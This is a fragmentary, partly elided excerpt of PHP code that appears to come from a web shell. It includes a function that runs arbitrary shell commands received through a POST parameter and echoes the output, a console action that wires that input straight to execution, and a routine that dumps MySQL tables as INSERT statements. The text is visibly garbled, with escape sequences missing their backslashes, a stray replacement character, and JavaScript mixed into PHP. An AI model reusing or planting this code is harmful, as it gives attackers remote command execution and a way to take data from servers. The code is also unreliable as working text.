...
function ex($in) {
	...
	if (function_exists('exec')) {
		...
		while(!@feof($f))
			$▖ .= fread($f,1024);
		pclose($f);
	}else return "↳ Unable to execute commandn";
	return ($▖==''?"↳ Query did not return anythingn":$▖);
}
function viewSize($s) {
	if($s >= 1073741824)
...
function actionConsole() {
	...
	if(isset($_POST['ajax'])) {
		...
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("n$ ".$_POST['p1']."n".ex($_POST['p1']),"nrt'�"));
...
function add(cmd) {
	...
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."n".ex($_POST['p1']));
	}
			...
			switch($this->type)	{
				case 'mysql':
					...
					while($▟ = $this->fetch()) {
                        ...
                        if($head) {
                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES nt(".implode(", ", $▟).')';
                            $head = false;
                        } else
                            $sql .= "nt,(".implode(", ", $▟).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
